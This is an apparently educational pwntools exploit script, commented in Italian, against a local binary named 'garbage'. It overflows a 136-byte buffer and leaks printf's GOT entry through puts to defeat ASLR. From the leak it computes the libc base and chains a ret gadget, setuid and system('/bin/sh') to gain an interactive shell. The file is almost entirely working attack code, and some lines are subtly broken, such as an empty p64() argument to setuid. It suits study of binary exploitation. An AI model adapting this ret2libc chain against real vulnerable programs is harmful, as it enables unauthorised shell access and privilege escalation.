#In questo caso ho ASRL attivo e quindi devo superarlo uso GOT PLT  (global offset table procedure linkage table) vedere cos'è (ha dentro gli indirizzi della libc, 
#quando il programma incontra una funzione vede se  la trova dentro la GOT)
#./garbage, vedo quanti char mi servono

from pwn import *

context(os = "Linux", arch="amd64")

#p.process("./garbage")

p = process("./garbage")

#stessa cartella in cui è l'exploit
garbage_file_reference = ELF("garbage")

#uso questo oggetto per avere l'accesso agli indirizzi delle funzioni in garbage
rop_to_leak_libc_base_address = ROP(garbage_file_reference)

#this is the reference to the libc on the system
libc_file_reference= ELF("/lib/x86_64-linux-gnu/libc.so.6")

#è come usare ropper con pop rdi; ret;
#sto aggiungendo alla chain il pop rdi; ret;
#rop_to_leak_libc_base_address.search(regs=['rdi'], order = "regs")

#ora cerco l'address della printf nella got (che viene poi convertito in quello reale prima di essere stampato dalla puts) che uso per ottenere l'indirizzo della libc
#lo sto mettendo come paramentro della funzione puts 
rop_to_leak_libc_base_address.puts(garbage_file_reference.got['printf'])

rop_to_leak_libc_base_address.call(garbage_file_reference.symbols['main'])


log.info("Chain to leak the libc address:\n"+rop_to_leak_libc_base_address.dump())

#buffer per buffer overflow
buf = b"A"*136
#mi serve trovare l'offset got_printf e di plt_printf

#payload che contiene buf + pop rdi + got address di printf + plt address di puts
payload = buf + rop_to_leak_libc_base_address.chain()
#log.info(payload)





p.sendline(payload)

#rimango in ascolto finchè non arrivo a access denied
p.recvuntil(b"access denied.\n")

#leggo fino all'ultimo carattere (con -1 tolgo il newline \n se no non leggo bene l'indirizzo)
#ljust lo mette nella forma 8 byte e aggiunge i null byte quando manca qualcosa
#faccio l'unpack
leaked_printf_address = u64(p.recvline()[:-1].ljust(8, b'\x00'))

#print in hex
log.info("leaked_printf_address: 0x%x " % leaked_printf_address)







#ldd garbage per trovare il path di libc
#readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep printf
libc_printf = libc_file_reference.symbols['printf']


#mi serve per prendere anche le altre funzioni vere
offset = leaked_printf_address - libc_printf


#modifico l'indirizzo di base della libc per trovare le funzioni che mi servono
libc_file_reference.address = offset 

rop_for_gain_shell=ROP(libc_file_reference)

#ret per allineare lo stack
ret_gadget = rop_for_gain_shell.find_gadget(['ret'])[0]
log.info(next(libc_file_reference.search(0)))
rop_for_gain_shell.setuid( p64())

#next is used to read the content of the object returned
bin_sh_address = next(libc_file_reference.search(b'/bin/sh'))


#passo l'address di /bin/sh alla funzione system per eseguire la shell
rop_for_gain_shell.system(bin_sh_address)


log.info("chain to gain the shell:\n"+rop_for_gain_shell.dump())

payload = buf + p64(ret_gadget)+ rop_for_gain_shell.chain()
p.sendline(payload)


#così non si ferma il programma, se non lo metto lo script pyhton finisce e il debug si chiude
p.interactive()

